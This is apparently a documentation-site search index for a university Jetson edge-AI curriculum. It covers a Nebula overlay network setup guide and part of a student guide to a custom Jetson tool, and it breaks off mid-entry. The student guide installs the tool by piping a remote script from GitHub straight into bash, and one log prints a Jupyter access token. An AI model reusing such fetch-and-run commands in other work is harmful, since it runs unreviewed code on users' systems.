{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"\ud83d\udcd8 Jetson + AI Curriculum Guide","text":"<p>Welcome to the official documentation for the SJSU Cyber-AI Curriculum. This guide is designed for students to learn about embedded systems, Linux, AI, and cybersecurity through hands-on labs on the NVIDIA Jetson Orin Nano platform.</p>"},{"location":"#getting-started","title":"\ud83e\udded Getting Started","text":""},{"location":"#how-to-build-this-documentation","title":"\ud83d\udd27 How to Build This Documentation","text":"<p>You can build this curriculum as a local HTML site or generate a PDF using MkDocs and the Material for MkDocs theme.</p>"},{"location":"#1-install-mkdocs-and-dependencies","title":"1. Install MkDocs and dependencies","text":"<pre><code>% conda activate mypy311\npip install mkdocs mkdocs-material\npip install mkdocs-revealjs\n</code></pre>"},{"location":"#2-build-and-serve-the-site-locally","title":"2. Build and serve the site locally","text":"<pre><code>mkdocs serve\n</code></pre> <p>Open your browser to: http://localhost:8000</p>"},{"location":"#3-build-for-static-html-site","title":"3. Build for static HTML site","text":"<pre><code>mkdocs build\n</code></pre> <p>HTML files will be generated in the <code>site/</code> directory.</p>"},{"location":"#4-export-to-pdf-optional","title":"4. Export to PDF (Optional)","text":"<p>Install <code>weasyprint</code> or use browser print-to-PDF from <code>localhost:8000</code>.</p>"},{"location":"#5-push-to-github-pages-optional","title":"5. Push to Github Pages (Optional)","text":"<pre><code>mkdocs gh-deploy\n</code></pre>"},{"location":"#curriculum-structure","title":"\ud83d\udcda Curriculum Structure","text":""},{"location":"#getting-started-with-jetson","title":"\ud83d\udd30 Getting Started with Jetson","text":"<ul> <li>\u2705 sjsujetsontool Guide</li> <li>\ud83d\udccb sjsujetsontool Cheatsheet</li> <li>\ud83d\udd27 Introduction to NVIDIA Jetson</li> <li>\ud83d\ude80 CUDA Programming on Jetson</li> </ul>"},{"location":"#linux-fundamentals","title":"\ud83d\udc27 Linux Fundamentals","text":"<ul> <li>\ud83d\udca1 Linux OS Basics</li> <li>\ud83c\udf10 Linux Networking Tools</li> </ul>"},{"location":"#ai-llm","title":"\ud83e\udd16 AI &amp; LLM","text":"<ul> <li>\ud83e\udde0 Deep Learning &amp; CNN</li> <li>\ud83e\udde0 Transformers &amp; NLP Applications</li> <li>\ud83d\ude80 Large Language Models on Jetson</li> <li>\ud83d\udcda NLP Applications &amp; LLM Optimization</li> <li>\u270d\ufe0f Prompt Engineering &amp; LangChain</li> <li>\ud83d\udd0e RAG Applications with LangChain</li> </ul>"},{"location":"#author","title":"\ud83d\udc68\u200d\ud83c\udfeb Author","text":"<p>Author: Dr. Kaikai Liu, Ph.D. Position: Associate Professor, Computer Engineering Institution: San Jose State University Contact: kaikai.liu@sjsu.edu</p> <p>Learn. Build. Defend. Empower with Edge AI on Jetson.</p>"},{"location":"my_nebula_overlay_network_guide/","title":"Nebula Overlay Network Guide","text":""},{"location":"my_nebula_overlay_network_guide/#introduction","title":"Introduction","text":"<p>Nebula is a scalable overlay networking tool with a focus on performance, simplicity, and security. It lets you seamlessly connect computers anywhere in the world. Nebula is portable, running on Linux, OSX, Windows, iOS, and Android. It can be used to connect a small number of computers, but is also able to connect tens of thousands of computers.</p>"},{"location":"my_nebula_overlay_network_guide/#technical-background","title":"Technical Background","text":""},{"location":"my_nebula_overlay_network_guide/#what-is-an-overlay-network","title":"What is an Overlay Network?","text":"<p>An overlay network is a computer network that is layered on top of another network. Nodes in the overlay network are connected by virtual or logical links that correspond to paths, perhaps through many physical links, in the underlying network.</p>"},{"location":"my_nebula_overlay_network_guide/#key-features-of-nebula","title":"Key Features of Nebula","text":"<ul> <li>Zero Trust Architecture: Every connection is authenticated and encrypted</li> <li>Mesh Networking: Direct peer-to-peer connections when possible</li> <li>NAT Traversal: Works behind firewalls and NATs</li> <li>Certificate-based Authentication: Uses X.509 certificates for identity</li> <li>Lighthouse Discovery: Centralized discovery with decentralized communication</li> <li>Cross-platform: Runs on multiple operating systems</li> </ul>"},{"location":"my_nebula_overlay_network_guide/#architecture-components","title":"Architecture Components","text":""},{"location":"my_nebula_overlay_network_guide/#1-certificate-authority-ca","title":"1. Certificate Authority (CA)","text":"<p>The CA is responsible for: - Generating and signing certificates for all nodes - Defining network topology and permissions - Managing certificate lifecycle</p>"},{"location":"my_nebula_overlay_network_guide/#2-lighthouse-nodes","title":"2. Lighthouse Nodes","text":"<p>Lighthouses serve as: - Initial connection points for nodes - Directory services for peer discovery - NAT traversal coordination</p>"},{"location":"my_nebula_overlay_network_guide/#3-regular-nodes","title":"3. Regular Nodes","text":"<p>Regular nodes are: - End-user devices or servers - Connect to lighthouses for initial discovery - Establish direct connections with peers when possible</p>"},{"location":"my_nebula_overlay_network_guide/#installation","title":"Installation","text":""},{"location":"my_nebula_overlay_network_guide/#download-nebula","title":"Download Nebula","text":"<pre><code># Download latest release for Linux\nwget https://github.com/slackhq/nebula/releases/latest/download/nebula-linux-amd64.tar.gz\ntar -xzf nebula-linux-amd64.tar.gz\nsudo mv nebula /usr/local/bin/\nsudo mv nebula-cert /usr/local/bin/\n\n# For macOS\nbrew install nebula\n\n# For Windows (using chocolatey)\nchoco install nebula\n</code></pre>"},{"location":"my_nebula_overlay_network_guide/#configuration-setup","title":"Configuration Setup","text":""},{"location":"my_nebula_overlay_network_guide/#step-1-create-certificate-authority","title":"Step 1: Create Certificate Authority","text":"<pre><code># Create CA certificate and key\nnebula-cert ca -name \"MyCompany Network\"\n\n# This creates:\n# - ca.crt (certificate authority certificate)\n# - ca.key (certificate authority private key)\n</code></pre>"},{"location":"my_nebula_overlay_network_guide/#step-2-generate-node-certificates","title":"Step 2: Generate Node Certificates","text":"<pre><code># Generate lighthouse certificate\nnebula-cert sign -name \"lighthouse1\" -ip \"192.168.100.1/24\" -ca-crt ca.crt -ca-key ca.key\n\n# Generate client certificates\nnebula-cert sign -name \"laptop\" -ip \"192.168.100.10/24\" -ca-crt ca.crt -ca-key ca.key\nnebula-cert sign -name \"server\" -ip \"192.168.100.20/24\" -ca-crt ca.crt -ca-key ca.key\n\n# Generate certificate with groups (for access control)\nnebula-cert sign -name \"admin-laptop\" -ip \"192.168.100.15/24\" -groups \"admin,users\" -ca-crt ca.crt -ca-key ca.key\n</code></pre>"},{"location":"my_nebula_overlay_network_guide/#step-3-create-configuration-files","title":"Step 3: Create Configuration Files","text":""},{"location":"my_nebula_overlay_network_guide/#lighthouse-configuration-lighthouseyml","title":"Lighthouse Configuration (lighthouse.yml)","text":"<pre><code>pki:\n  ca: /etc/nebula/ca.crt\n  cert: /etc/nebula/lighthouse1.crt\n  key: /etc/nebula/lighthouse1.key\n\nstatic_host_map:\n  \"192.168.100.1\": [\"YOUR_PUBLIC_IP:4242\"]\n\nlighthouse:\n  am_lighthouse: true\n  serve_dns: false\n  interval: 60\n  hosts: []\n\nlisten:\n  host: 0.0.0.0\n  port: 4242\n\npunchy:\n  punch: true\n  respond: true\n  delay: 1s\n\nrelay:\n  am_relay: true\n  use_relays: true\n\ntun:\n  disabled: false\n  dev: nebula1\n  drop_local_broadcast: false\n  drop_multicast: false\n  tx_queue: 500\n  mtu: 1300\n\nlogging:\n  level: info\n  format: text\n\nfirewall:\n  conntrack:\n    tcp_timeout: 12m\n    udp_timeout: 3m\n    default_timeout: 10m\n    max_connections: 100000\n\n  outbound:\n    - port: any\n      proto: any\n      host: any\n\n  inbound:\n    - port: any\n      proto: icmp\n      host: any\n    - port: 22\n      proto: tcp\n      groups: [\"admin\"]\n    - port: 80,443\n      proto: tcp\n      host: any\n</code></pre>"},{"location":"my_nebula_overlay_network_guide/#client-configuration-clientyml","title":"Client Configuration (client.yml)","text":"<pre><code>pki:\n  ca: /etc/nebula/ca.crt\n  cert: /etc/nebula/laptop.crt\n  key: /etc/nebula/laptop.key\n\nstatic_host_map:\n  \"192.168.100.1\": [\"LIGHTHOUSE_PUBLIC_IP:4242\"]\n\nlighthouse:\n  am_lighthouse: false\n  interval: 60\n  hosts:\n    - \"192.168.100.1\"\n\nlisten:\n  host: 0.0.0.0\n  port: 0\n\npunchy:\n  punch: true\n  respond: true\n  delay: 1s\n\nrelay:\n  am_relay: false\n  use_relays: true\n  relays:\n    - \"192.168.100.1\"\n\ntun:\n  disabled: false\n  dev: nebula1\n  drop_local_broadcast: false\n  drop_multicast: false\n  tx_queue: 500\n  mtu: 1300\n\nlogging:\n  level: info\n  format: text\n\nfirewall:\n  conntrack:\n    tcp_timeout: 12m\n    udp_timeout: 3m\n    default_timeout: 10m\n    max_connections: 100000\n\n  outbound:\n    - port: any\n      proto: any\n      host: any\n\n  inbound:\n    - port: any\n      proto: icmp\n      host: any\n    - port: 22\n      proto: tcp\n      host: any\n</code></pre>"},{"location":"my_nebula_overlay_network_guide/#command-line-operations","title":"Command Line Operations","text":""},{"location":"my_nebula_overlay_network_guide/#starting-nebula","title":"Starting Nebula","text":"<pre><code># Start nebula with configuration file\nsudo nebula -config /etc/nebula/config.yml\n\n# Start in background\nsudo nebula -config /etc/nebula/config.yml &amp;\n\n# Start with specific log level\nsudo nebula -config /etc/nebula/config.yml -log-level debug\n</code></pre>"},{"location":"my_nebula_overlay_network_guide/#testing-configuration","title":"Testing Configuration","text":"<pre><code># Test configuration file\nnebula -config /etc/nebula/config.yml -test\n\n# Print configuration and exit\nnebula -config /etc/nebula/config.yml -print-config\n</code></pre>"},{"location":"my_nebula_overlay_network_guide/#certificate-management","title":"Certificate Management","text":"<pre><code># View certificate details\nnebula-cert print -path lighthouse1.crt\n\n# Verify certificate against CA\nnebula-cert verify -ca ca.crt -crt laptop.crt\n\n# List certificate information\nnebula-cert print -json -path laptop.crt | jq .\n</code></pre>"},{"location":"my_nebula_overlay_network_guide/#network-diagnostics","title":"Network Diagnostics","text":"<pre><code># Check if nebula is running\nps aux | grep nebula\n\n# Check nebula interface\nip addr show nebula1\n\n# Test connectivity\nping 192.168.100.1\n\n# Check routing table\nip route | grep nebula\n\n# Monitor nebula logs\nsudo journalctl -u nebula -f\n</code></pre>"},{"location":"my_nebula_overlay_network_guide/#systemd-service-setup","title":"Systemd Service Setup","text":""},{"location":"my_nebula_overlay_network_guide/#create-service-file","title":"Create Service File","text":"<pre><code>sudo tee /etc/systemd/system/nebula.service &gt; /dev/null &lt;&lt;EOF\n[Unit]\nDescription=Nebula overlay networking tool\nWants=basic.target\nAfter=basic.target network.target\nBefore=sshd.service\n\n[Service]\nSyslogIdentifier=nebula\nExecReload=/bin/kill -HUP \\$MAINPID\nExecStart=/usr/local/bin/nebula -config /etc/nebula/config.yml\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\nEOF\n</code></pre>"},{"location":"my_nebula_overlay_network_guide/#enable-and-start-service","title":"Enable and Start Service","text":"<pre><code># Reload systemd\nsudo systemctl daemon-reload\n\n# Enable service\nsudo systemctl enable nebula\n\n# Start service\nsudo systemctl start nebula\n\n# Check status\nsudo systemctl status nebula\n</code></pre>"},{"location":"my_nebula_overlay_network_guide/#advanced-configuration","title":"Advanced Configuration","text":""},{"location":"my_nebula_overlay_network_guide/#firewall-rules-with-groups","title":"Firewall Rules with Groups","text":"<pre><code>firewall:\n  inbound:\n    # Allow ICMP from anyone\n    - port: any\n      proto: icmp\n      host: any\n\n    # SSH access only for admin group\n    - port: 22\n      proto: tcp\n      groups: [\"admin\"]\n\n    # Web services for specific subnets\n    - port: 80,443\n      proto: tcp\n      cidr: \"192.168.100.0/24\"\n\n    # Database access for app servers\n    - port: 3306,5432\n      proto: tcp\n      groups: [\"database-clients\"]\n</code></pre>"},{"location":"my_nebula_overlay_network_guide/#multiple-lighthouse-setup","title":"Multiple Lighthouse Setup","text":"<pre><code>static_host_map:\n  \"192.168.100.1\": [\"lighthouse1.example.com:4242\"]\n  \"192.168.100.2\": [\"lighthouse2.example.com:4242\"]\n\nlighthouse:\n  hosts:\n    - \"192.168.100.1\"\n    - \"192.168.100.2\"\n</code></pre>"},{"location":"my_nebula_overlay_network_guide/#custom-routing","title":"Custom Routing","text":"<pre><code># Route specific subnets through nebula\nroutes:\n  \"10.0.0.0/8\": \"192.168.100.1\"\n  \"172.16.0.0/12\": \"192.168.100.2\"\n\n# Unsafe routes (routes to non-nebula networks)\nunsafe_routes:\n  - route: \"10.1.0.0/16\"\n    via: \"192.168.100.10\"\n    mtu: 1300\n</code></pre>"},{"location":"my_nebula_overlay_network_guide/#troubleshooting","title":"Troubleshooting","text":""},{"location":"my_nebula_overlay_network_guide/#common-issues","title":"Common Issues","text":"<ol> <li> <p>Connection Problems <pre><code># Check if lighthouse is reachable\nnc -u LIGHTHOUSE_IP 4242\n\n# Verify certificates\nnebula-cert verify -ca ca.crt -crt node.crt\n</code></pre></p> </li> <li> <p>NAT Traversal Issues <pre><code># Enable punchy mode\npunchy:\n  punch: true\n  respond: true\n  delay: 1s\n</code></pre></p> </li> <li> <p>Performance Issues <pre><code># Adjust MTU\ntun:\n  mtu: 1300\n\n# Increase buffer sizes\nlisten:\n  read_buffer: 10485760\n  write_buffer: 10485760\n</code></pre></p> </li> </ol>"},{"location":"my_nebula_overlay_network_guide/#debug-commands","title":"Debug Commands","text":"<pre><code># Enable debug logging\nnebula -config config.yml -log-level debug\n\n# Check interface statistics\ncat /proc/net/dev | grep nebula\n\n# Monitor traffic\nsudo tcpdump -i nebula1\n\n# Check iptables rules\nsudo iptables -L -n -v\n</code></pre>"},{"location":"my_nebula_overlay_network_guide/#security-best-practices","title":"Security Best Practices","text":"<ol> <li>Certificate Management</li> <li>Keep CA key secure and offline</li> <li>Use short certificate lifetimes</li> <li> <p>Implement certificate rotation</p> </li> <li> <p>Network Segmentation</p> </li> <li>Use groups for access control</li> <li>Implement least privilege firewall rules</li> <li> <p>Separate admin and user networks</p> </li> <li> <p>Monitoring</p> </li> <li>Monitor connection logs</li> <li>Set up alerting for failed connections</li> <li>Regular security audits</li> </ol>"},{"location":"my_nebula_overlay_network_guide/#sample-use-cases","title":"Sample Use Cases","text":""},{"location":"my_nebula_overlay_network_guide/#1-remote-office-connection","title":"1. Remote Office Connection","text":"<pre><code># Lighthouse at main office\nnebula-cert sign -name \"office-gateway\" -ip \"192.168.100.1/24\" -groups \"gateway\" -ca-crt ca.crt -ca-key ca.key\n\n# Remote office router\nnebula-cert sign -name \"remote-office\" -ip \"192.168.100.50/24\" -groups \"remote\" -ca-crt ca.crt -ca-key ca.key\n</code></pre>"},{"location":"my_nebula_overlay_network_guide/#2-developer-access","title":"2. Developer Access","text":"<pre><code># Developer laptops\nnebula-cert sign -name \"dev-laptop-1\" -ip \"192.168.100.101/24\" -groups \"developers\" -ca-crt ca.crt -ca-key ca.key\nnebula-cert sign -name \"dev-laptop-2\" -ip \"192.168.100.102/24\" -groups \"developers\" -ca-crt ca.crt -ca-key ca.key\n\n# Development servers\nnebula-cert sign -name \"dev-server\" -ip \"192.168.100.200/24\" -groups \"servers,development\" -ca-crt ca.crt -ca-key ca.key\n</code></pre>"},{"location":"my_nebula_overlay_network_guide/#3-iot-device-network","title":"3. IoT Device Network","text":"<pre><code># IoT devices with restricted access\nnebula-cert sign -name \"sensor-1\" -ip \"192.168.100.201/24\" -groups \"iot,sensors\" -ca-crt ca.crt -ca-key ca.key\nnebula-cert sign -name \"camera-1\" -ip \"192.168.100.202/24\" -groups \"iot,cameras\" -ca-crt ca.crt -ca-key ca.key\n\n# IoT management server\nnebula-cert sign -name \"iot-manager\" -ip \"192.168.100.10/24\" -groups \"management\" -ca-crt ca.crt -ca-key ca.key\n</code></pre>"},{"location":"my_nebula_overlay_network_guide/#conclusion","title":"Conclusion","text":"<p>Nebula provides a robust, scalable solution for creating secure overlay networks. Its certificate-based authentication, mesh networking capabilities, and flexible firewall rules make it suitable for various use cases from small remote teams to large enterprise deployments.</p> <p>For more information, visit the official Nebula documentation and community resources.</p>"},{"location":"curriculum/00_sjsujetsontool_guide/","title":"\ud83e\udde0 NVIDIA Jetson Orin Nano Student Guide","text":"<p>Author: Dr. Kaikai Liu, Ph.D. Position: Associate Professor, Computer Engineering Institution: San Jose State University Contact: kaikai.liu@sjsu.edu</p>"},{"location":"curriculum/00_sjsujetsontool_guide/#overview","title":"\ud83d\udccc Overview","text":"<p>This guide introduces the NVIDIA Jetson Orin Nano, explains how to install and use our custom Jetson utility script <code>sjsujetsontool</code>, and provides step-by-step instructions for development tasks such as launching servers, running AI models, setting up Jupyter, and managing devices.</p>"},{"location":"curriculum/00_sjsujetsontool_guide/#what-is-nvidia-jetson-orin-nano","title":"\ud83e\udde0 What Is NVIDIA Jetson Orin Nano?","text":"<p>The Jetson Orin Nano is a powerful, energy-efficient AI edge computing board by NVIDIA. Key features:</p> <ul> <li>\u2705 6-core ARM Cortex CPU</li> <li>\u2705 Ampere GPU with up to 1024 CUDA cores</li> <li>\u2705 Ideal for robotics, vision, AI model serving, and cyber experiments</li> <li>\u2705 Supports JetPack SDK with Ubuntu, CUDA, cuDNN, TensorRT</li> </ul>"},{"location":"curriculum/00_sjsujetsontool_guide/#connecting-to-jetson-via-local-hostname","title":"\ud83c\udf10 Connecting to Jetson via <code>.local</code> Hostname","text":"<p>Jetson devices with mDNS enabled can be accessed using the <code>.local</code> hostname from macOS or Linux:</p> <pre><code>ssh username@jetson-hostname.local\n</code></pre> <p>For example:</p> <pre><code>ssh sjsujetson@sjsujetson-01.local\n</code></pre> <p>If this doesn't work, make sure <code>avahi-daemon</code> is running on Jetson and that your network supports mDNS.</p> <p>If you want to enable X11-forwarding, you can use  <pre><code>% ssh -X sjsujetson@sjsujetson-01.local\nsjsujetson@sjsujetson-01:~$ xclock #test x11\n</code></pre></p>"},{"location":"curriculum/00_sjsujetsontool_guide/#installing-sjsujetsontool","title":"\u2699\ufe0f Installing <code>sjsujetsontool</code>","text":"<p>A command-line tool for Jetson-based workflows: container management, model serving, AI apps, and more.</p>"},{"location":"curriculum/00_sjsujetsontool_guide/#one-line-install-no-sudo-required","title":"\u2705 One-line install (no sudo required)","text":"<pre><code>curl -fsSL https://raw.githubusercontent.com/lkk688/edgeAI/main/jetson/install_sjsujetsontool.sh | bash\n</code></pre> <p>After the script installation, run <code>sjsujetsontool update</code> to update the local container and script. The container update takes long time. <pre><code>sjsujetson@sjsujetson-01:~$ curl -fsSL https://raw.githubusercontent.com/lkk688/edgeAI/main/jetson/install_sjsujetsontool.sh | bash\n\u2b07\ufe0f Downloading sjsujetsontool from GitHub...\n\u2705 Downloaded script.\n\ud83d\udce6 Installing to /home/sjsujetson/.local/bin/sjsujetsontool\n\u2705 Installed successfully. You can now run: sjsujetsontool\nsjsujetson@sjsujetson-01:~$ sjsujetsontool update\n\ud83e\udde0 Detected Jetson Model: NVIDIA Jetson Orin Nano Engineering Reference Developer Kit Super\n\u2699\ufe0f  CUDA Version: 12.6\n\u2139\ufe0f The 'update' command has been split into two separate commands:\n  - 'update-container': Updates only the Docker container\n  - 'update-script': Updates only this script\n\\nRunning both updates sequentially...\n\\n\ud83d\udd04 Running container update...\n\ud83e\udde0 Detected Jetson Model: NVIDIA Jetson Orin Nano Engineering Reference Developer Kit Super\n\u2699\ufe0f  CUDA Version: 12.6\n\ud83d\udd0d Checking Docker image update...\n\u2b07\ufe0f Pulling latest image (this may take a while)...\nlatest: Pulling from cmpelkk/jetson-llm\n....\n\u2713 Pull complete.\n\ud83d\udce6 New version detected. Updating local image...\n\u2705 Local container updated from Docker Hub.\n\\n\ud83d\udd04 Running script update...\n\ud83e\udde0 Detected Jetson Model: NVIDIA Jetson Orin Nano Engineering Reference Developer Kit Super\n\u2699\ufe0f  CUDA Version: 12.6\n\u2b07\ufe0f Updating sjsujetsontool script...\n\u2b07\ufe0f Downloading latest script...\n#################################################################################################### 100.0%\n\u2705 Script downloaded. Replacing current script...\n\u2705 Script updated. Please rerun your command.\n</code></pre></p> <p>Another option is just run the update command for two times: <pre><code>student@sjsujetson-02:~$ hostname\nsjsujetson-02\nstudent@sjsujetson-02:~$ sjsujetsontool update\n\u2b07\ufe0f  Updating sjsujetsontool from GitHub...\n\ud83d\udd01 Backing up current script to /home/student/.local/bin/sjsujetsontool.bak\n\u2705 Update complete. Backup saved at /home/student/.local/bin/sjsujetsontool.bak\n/home/student/.local/bin/sjsujetsontool: line 228: syntax error near unexpected token `('\n/home/student/.local/bin/sjsujetsontool: line 228: `    echo \"\u274c $name not running (port $port closed)\"'\nstudent@sjsujetson-02:~$ sjsujetsontool update\n\ud83e\udde0 Detected Jetson Model: NVIDIA Jetson Orin Nano Engineering Reference Developer Kit Super\n\u2699\ufe0f  CUDA Version: 12.6\n\u2139\ufe0f The 'update' command has been split into two separate commands:\n  - 'update-container': Updates only the Docker container\n  - 'update-script': Updates only this script\n\\nRunning both updates sequentially...\n\\n\ud83d\udd04 Running container update...\n\ud83e\udde0 Detected Jetson Model: NVIDIA Jetson Orin Nano Engineering Reference Developer Kit Super\n\u2699\ufe0f  CUDA Version: 12.6\n\ud83d\udd0d Checking Docker image update...\n\u2b07\ufe0f Pulling latest image (this may take a while)...\nlatest: Pulling from cmpelkk/jetson-llm\nDigest: sha256:8021643930669290377d9fc19741cd8c012dbfb7d5f25c7189651ec875b03a78\nStatus: Image is up to date for cmpelkk/jetson-llm:latest\ndocker.io/cmpelkk/jetson-llm:latest\n\u2713 Pull complete.\n\u2705 Local container is already up-to-date.\n\\n\ud83d\udd04 Running script update...\n\ud83e\udde0 Detected Jetson Model: NVIDIA Jetson Orin Nano Engineering Reference Developer Kit Super\n\u2699\ufe0f  CUDA Version: 12.6\n\u2b07\ufe0f Updating sjsujetsontool script...\n\u2b07\ufe0f Downloading latest script...\n#################################################################################################### 100.0%\n\u2705 Script downloaded. Replacing current script...\n\u2705 Script updated. Please rerun your command.\n</code></pre></p> <p>Verify:</p> <pre><code>sjsujetsontool list\n</code></pre> <p>You can check the script versions: <pre><code>sjsujetson@sjsujetson-01:/Developer/edgeAI$ sjsujetsontool version\n\ud83e\udde0 Detected Jetson Model: NVIDIA Jetson Orin Nano Engineering Reference Developer Kit Super\n\u2699\ufe0f  CUDA Version: 12.6\n\ud83e\uddfe sjsujetsontool Script Version: v0.9.0\n\ud83e\uddca Docker Image: jetson-llm:v1\n\ud83d\udd0d Image ID: sha256:9868985d80e4d1d43309d72ba85b700f3ac064233fcbf58c8ec22555d85f8c2f\n</code></pre></p> <p>The <code>sjsujetsontool</code> wraps python apps running via container and makes running code inside the container easy to use. <code>docker</code> without sudo is already setup in the jetson device. Check existing containers available in the Jetson: <pre><code>sjsujetson@sjsujetson-01:~$ docker images\nREPOSITORY                TAG              IMAGE ID       CREATED         SIZE\njetson-llm-v1             latest           8236678f7ef1   6 days ago      9.89GB\njetson-pytorch-v1         latest           da28af1b9eed   9 days ago      9.71GB\nhello-world               latest           f1f77a0f96b7   5 months ago    5.2kB\nnvcr.io/nvidia/pytorch    24.12-py3-igpu   ee796da7f569   6 months ago    9.63GB\nnvcr.io/nvidia/l4t-base   r36.2.0          46b8e6a6a6a7   19 months ago   750MB\nsjsujetson@sjsujetson-01:~$ sjsujetsontool shell #enter into the container\nroot@sjsujetson-01:/workspace#\n</code></pre> if you face errors like \"Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?\", restart the docker: <pre><code>sudo systemctl start docker\nsudo systemctl status docker\n</code></pre></p> <p>The <code>\\Developer</code> and <code>\\Developer\\models</code> folders in the jetson host are mounted to the container in the path of <code>\\Developer</code> and <code>\\models</code></p>"},{"location":"curriculum/00_sjsujetsontool_guide/#hostname-changes-sudo-required","title":"\u2705 Hostname changes (sudo required)","text":"<p><pre><code>sjsujetson@sjsujetson-01:~$ hostname\nsjsujetson-01\nsjsujetson@sjsujetson-01:~$ sjsujetsontool set-hostname sjsujetson-02\n\ud83e\udde0 Detected Jetson Model: NVIDIA Jetson Orin Nano Engineering Reference Developer Kit Super\n\u2699\ufe0f  CUDA Version: 12.6\n\ud83d\udd27 Setting hostname to: sjsujetson-02\n[sudo] password for sjsujetson: \n\ud83d\udcdd Updating /etc/hosts...\n\ud83d\udd04 Resetting machine-id...\n\ud83c\udd94 Writing device ID to /etc/device-id\n\ud83d\udd01 Please reboot for changes to fully apply.\nsjsujetson@sjsujetson-01:~$ sudo reboot\n</code></pre> You will need to use the new hostname to ssh into the device <pre><code>% ssh -X sjsujetson@sjsujetson-02.local\nsjsujetson@sjsujetson-02:~$ hostname\nsjsujetson-02\n</code></pre></p> <p>For TA, run this additional steps: <pre><code>sudo chfn -f \"Student\" student\nsudo passwd student\nsjsujetson@sjsujetson-02:/Developer/edgeAI$ sjsujetsontool force_git_pull\n</code></pre> If you\u2019re logged in as student and want to change your own password: <code>passwd</code>. You\u2019ll be prompted to enter your current password, then the new password twice.</p>"},{"location":"curriculum/00_sjsujetsontool_guide/#exter-the-container-shell","title":"\u2705 Exter the Container Shell","text":"<p>Run the <code>sjsujetsontool shell</code> command line to enter into the shell of the container <pre><code>sjsujetson@sjsujetson-01:/Developer/edgeAI$ sjsujetsontool shell\n\ud83e\udde0 Detected Jetson Model: NVIDIA Jetson Orin Nano Engineering Reference Developer Kit Super\n\u2699\ufe0f  CUDA Version: 12.6\nroot@sjsujetson-01:/workspace# pip install transformers==4.37.0 #install transformer package\n</code></pre></p> <p>Exit the container via <code>exit</code>, and the container is still running <pre><code>root@sjsujetson-01:/workspace# exit\nexit\nsjsujetson@sjsujetson-01:/Developer/edgeAI$ docker ps\nCONTAINER ID   IMAGE          COMMAND                  CREATED      STATUS      PORTS     NAMES\nc4010b14e9c0   8236678f7ef1   \"/opt/nvidia/nvidia_\u2026\"   4 days ago   Up 4 days             jetson-dev\n</code></pre></p> <p>If you want to stop the container, you can use <code>sjsujetsontool stop</code> <pre><code>sjsujetson@sjsujetson-01:/Developer/edgeAI$ sjsujetsontool stop\n\ud83e\udde0 Detected Jetson Model: NVIDIA Jetson Orin Nano Engineering Reference Developer Kit Super\n\u2699\ufe0f  CUDA Version: 12.6\n\ud83d\uded1 Stopping container...\njetson-dev\nsjsujetson@sjsujetson-01:/Developer/edgeAI$ docker ps\nCONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES\n</code></pre></p>"},{"location":"curriculum/00_sjsujetsontool_guide/#common-usage-examples","title":"\ud83e\uddea Common Usage Examples","text":""},{"location":"curriculum/00_sjsujetsontool_guide/#sjsujetsontool-update","title":"\ud83e\uddfe <code>sjsujetsontool update</code>","text":"<p>Downloads the latest version of <code>sjsujetsontool</code> from GitHub and replaces the local version, keeping a backup.</p>"},{"location":"curriculum/00_sjsujetsontool_guide/#sjsujetsontool-list","title":"\ud83d\udccb <code>sjsujetsontool list</code>","text":"<p>Displays all available commands with usage examples.</p>"},{"location":"curriculum/00_sjsujetsontool_guide/#sjsujetsontool-jupyter","title":"\ud83d\udfe2 <code>sjsujetsontool jupyter</code>","text":"<p>Launches JupyterLab on port 8888 from inside the Jetson's Docker container. It allows interactive Python notebooks for AI model testing, data exploration, and debugging.</p> <p><pre><code>sjsujetson@sjsujetson-01:~$ sjsujetsontool jupyter\n....\n    To access the server, open this file in a browser:\n        file:///root/.local/share/jupyter/runtime/jpserver-1-open.html\n    Or copy and paste one of these URLs:\n        http://hostname:8888/lab?token=3bbbf2fbea22e917bdbace45cb414bbaeb52f1251163adcf\n        http://127.0.0.1:8888/lab?token=3bbbf2fbea22e917bdbace45cb414bbaeb52f1251163adcf\n</code></pre> you can access the jupyter server via the the provided url. If you want to remote access the jupyter server from another computer, you can replace the hostname with the IP address of the device. </p>"},{"location":"curriculum/00_sjsujetsontool_guide/#sjsujetsontool-run-scriptpy","title":"\ud83d\udc0d <code>sjsujetsontool run &lt;script.py&gt;</code>","text":"<p>Runs any Python script inside the preconfigured container. Ensures all ML/AI libraries and GPU drivers are properly set up. The path of <code>script.py</code> should be accessible by the container, for example, the <code>\\Developer</code> path: <pre><code>sjsujetson@sjsujetson-01:/Developer/models$ sjsujetsontool run /Developer/edgeAI/jetson/test.py \n\ud83e\udde0 Detected Jetson Model: NVIDIA Jetson Orin Nano Engineering Reference Developer Kit Super\n\u2699\ufe0f  CUDA Version: 12.6\n\ud83d\udc0d Running Python script: /Developer/edgeAI/jetson/test.py\n\ud83d\udce6 Python: 3.12.3 (main, Nov  6 2024, 18:32:19) [GCC 13.2.0]\n\ud83e\udde0 Torch: 2.6.0a0+df5bbc09d1.nv24.12\n\u2699\ufe0f  CUDA available: True\n\ud83d\udda5\ufe0f  CUDA version: Cuda compilation tools, release 12.6, V12.6.85\n\ud83d\udcda Transformers: 4.37.0\n\ud83e\uddec HuggingFace hub: Version: 0.33.2\n\ud83d\udca1 Platform: Linux-5.15.148-tegra-aarch64-with-glibc2.39\n\ud83d\udd0d Ollama: \u2705 Ollama installed: ollama version is 0.9.2\n</code></pre></p>"},{"location":"curriculum/00_sjsujetsontool_guide/#sjsujetsontool-ollama","title":"\ud83e\udde0 <code>sjsujetsontool ollama</code>","text":"<p>This section introduces its integrated <code>ollama</code> command group, which allows you to manage, run, and query large language models inside a Docker container on your Jetson.</p> <p><code>sjsujetsontool ollama &lt;subcommand&gt;</code> enables local management and interaction with Ollama models from inside a persistent Jetson container.</p> <p>Supported subcommands:</p> Subcommand Description <code>serve</code> Start Ollama REST API server (port 11434) <code>run &lt;model&gt;</code> Run specified model in interactive CLI <code>list</code> List all installed Ollama models <code>pull &lt;model&gt;</code> Download a new model <code>delete &lt;model&gt;</code> Remove a model from disk <code>status</code> Check if Ollama server is running <code>ask</code> Ask model a prompt via REST API <p>\ud83d\ude80 Commands and Usage</p> <ol> <li>Start the Ollama Server <pre><code>sjsujetsontool ollama serve\n</code></pre></li> </ol> <p>Starts the Ollama REST server inside the container, listening on http://localhost:11434.</p> <ol> <li> <p>Run a Model in CLI Mode <pre><code>$ sjsujetsontool ollama run 